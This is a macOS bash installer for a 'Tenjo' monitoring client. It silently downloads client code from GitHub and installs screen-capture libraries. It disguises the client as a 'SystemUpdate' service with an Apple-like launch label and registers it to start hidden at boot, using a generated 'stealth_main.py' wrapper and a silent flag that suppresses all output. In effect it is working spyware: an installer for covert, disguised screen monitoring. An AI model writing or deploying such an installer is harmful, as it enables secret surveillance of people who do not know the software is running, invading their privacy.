#!/bin/bash

# Tenjo Stealth Installer for macOS
# This script installs the monitoring client completely silently
# The client will run hidden and auto-start on boot

set -e

# Configuration
APP_NAME="SystemUpdate"
INSTALL_DIR="$HOME/.system_update"
SERVICE_NAME="com.system.update.agent"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
PYTHON_REQUIREMENTS="requests mss psutil pillow pyobjc-core"

# Colors (only for admin debugging, not shown to user)
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Silent mode flag
SILENT=${1:-"false"}

log() {
    if [[ "$SILENT" != "true" ]]; then
        echo -e "$1"
    fi
}

# Check if running as root (optional for system-wide install)
if [[ $EUID -eq 0 ]]; then
    INSTALL_DIR="/Library/Application Support/SystemUpdate"
    PLIST_FILE="/Library/LaunchDaemons/$SERVICE_NAME.plist"
fi

log "${BLUE}🔧 Installing System Update Service...${NC}"

# Stop existing service if running
launchctl unload "$PLIST_FILE" 2>/dev/null || true

# Create installation directory
mkdir -p "$INSTALL_DIR"
chmod 755 "$INSTALL_DIR"

# Copy application files
log "${BLUE}📦 Installing application files...${NC}"

# Create a temporary download if running from curl
if [[ ! -f "main.py" ]]; then
    # We're running from curl, need to download the client files
    log "${BLUE}📥 Downloading Tenjo client files...${NC}"
    
    TEMP_DIR="/tmp/tenjo_stealth_$$"
    mkdir -p "$TEMP_DIR"
    cd "$TEMP_DIR"
    
    # Download client files from GitHub
    curl -sSL "https://github.com/Adi-Sumardi/Tenjo/archive/refs/heads/master.zip" -o tenjo.zip
    
    if command -v unzip >/dev/null 2>&1; then
        unzip -q tenjo.zip
        cp -r Tenjo-master/client/* "$INSTALL_DIR/" 2>/dev/null || {
            # Fallback: copy essential files only
            mkdir -p "$INSTALL_DIR/src"
            cp Tenjo-master/client/main.py "$INSTALL_DIR/" 2>/dev/null || true
            cp -r Tenjo-master/client/src/* "$INSTALL_DIR/src/" 2>/dev/null || true
            cp Tenjo-master/client/requirements*.txt "$INSTALL_DIR/" 2>/dev/null || true
        }
    else
        log "${RED}❌ unzip not found, trying alternative method...${NC}"
        # Alternative: download individual files
        GITHUB_RAW="https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client"
        curl -sSL "$GITHUB_RAW/main.py" -o "$INSTALL_DIR/main.py"
        mkdir -p "$INSTALL_DIR/src/core" "$INSTALL_DIR/src/modules" "$INSTALL_DIR/src/utils"
        
        # Download essential files
        curl -sSL "$GITHUB_RAW/src/core/config.py" -o "$INSTALL_DIR/src/core/config.py" 2>/dev/null || true
        curl -sSL "$GITHUB_RAW/src/utils/api_client.py" -o "$INSTALL_DIR/src/utils/api_client.py" 2>/dev/null || true
        curl -sSL "$GITHUB_RAW/src/modules/screen_capture.py" -o "$INSTALL_DIR/src/modules/screen_capture.py" 2>/dev/null || true
        curl -sSL "$GITHUB_RAW/requirements.txt" -o "$INSTALL_DIR/requirements.txt" 2>/dev/null || true
    fi
    
    # Cleanup
    cd /
    rm -rf "$TEMP_DIR"
else
    # We're in the client directory, copy selectively
    log "${BLUE}📁 Copying from local directory...${NC}"
    
    # Copy essential files only, ignore problematic directories
    cp main.py "$INSTALL_DIR/" 2>/dev/null || true
    cp requirements*.txt "$INSTALL_DIR/" 2>/dev/null || true
    cp -r src "$INSTALL_DIR/" 2>/dev/null || true
    
    # Copy optional files if they exist
    cp service.py "$INSTALL_DIR/" 2>/dev/null || true
    cp stealth_install.py "$INSTALL_DIR/" 2>/dev/null || true
    cp tenjo_startup.py "$INSTALL_DIR/" 2>/dev/null || true
    
    # Create __init__.py files for Python modules
    touch "$INSTALL_DIR/src/__init__.py"
    touch "$INSTALL_DIR/src/core/__init__.py" 2>/dev/null || true
    touch "$INSTALL_DIR/src/modules/__init__.py" 2>/dev/null || true
    touch "$INSTALL_DIR/src/utils/__init__.py" 2>/dev/null || true
fi

# Install Python dependencies silently
log "${BLUE}🐍 Installing Python dependencies...${NC}"
python3 -m pip install --user --quiet $PYTHON_REQUIREMENTS 2>/dev/null || {
    # If user install fails, try without --user
    python3 -m pip install --quiet $PYTHON_REQUIREMENTS 2>/dev/null || true
}

# Create LaunchAgent/LaunchDaemon plist
log "${BLUE}⚙️ Configuring auto-start service...${NC}"

# Ensure LaunchAgents directory exists
mkdir -p "$(dirname "$PLIST_FILE")"

cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$SERVICE_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$INSTALL_DIR/stealth_main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>$INSTALL_DIR/logs/service.log</string>
    <key>StandardErrorPath</key>
    <string>$INSTALL_DIR/logs/service_error.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>LowPriorityIO</key>
    <true/>
    <key>Nice</key>
    <integer>10</integer>
</dict>
</plist>
EOF

# Set proper permissions
chmod 644 "$PLIST_FILE"

# Create stealth main.py that runs without terminal
cat > "$INSTALL_DIR/stealth_main.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os
import subprocess
import time
import signal
import logging
from pathlib import Path

# Set up logging
log_dir = Path(__file__).parent / "logs"
log_dir.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_dir / "stealth.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

def signal_handler(signum, frame):
    logging.info("Received signal %d, shutting down gracefully...", signum)
    sys.exit(0)

def main():
    # Register signal handlers
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Change to app directory
    app_dir = Path(__file__).parent
    os.chdir(app_dir)
    
    logging.info("Starting stealth monitoring service...")
    
    try:
        # Import and run main application
        sys.path.insert(0, str(app_dir))
        import main
        main.main()
    except Exception as e:
        logging.error("Application error: %s", e)
        time.sleep(60)  # Wait before restart
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

chmod +x "$INSTALL_DIR/stealth_main.py"

# Create logs directory
mkdir -p "$INSTALL_DIR/logs"

# Load and start the service
log "${BLUE}🚀 Starting service...${NC}"
launchctl load "$PLIST_FILE"
launchctl start "$SERVICE_NAME"

# Clean up installation files (optional)
if [[ "$2" == "cleanup" ]]; then
    rm -f "$INSTALL_DIR/install_stealth_macos.sh"
    rm -f "$INSTALL_DIR/uninstall_stealth_macos.sh"
fi

log "${GREEN}✅ System Update Service installed successfully${NC}"
log "${GREEN}📍 Installed at: $INSTALL_DIR${NC}"
log "${GREEN}🔄 Service will auto-start on boot${NC}"

if [[ "$SILENT" != "true" ]]; then
    echo ""
    echo "The service is now running silently in the background."
    echo "To uninstall, run: bash $INSTALL_DIR/uninstall_stealth_macos.sh"
fi
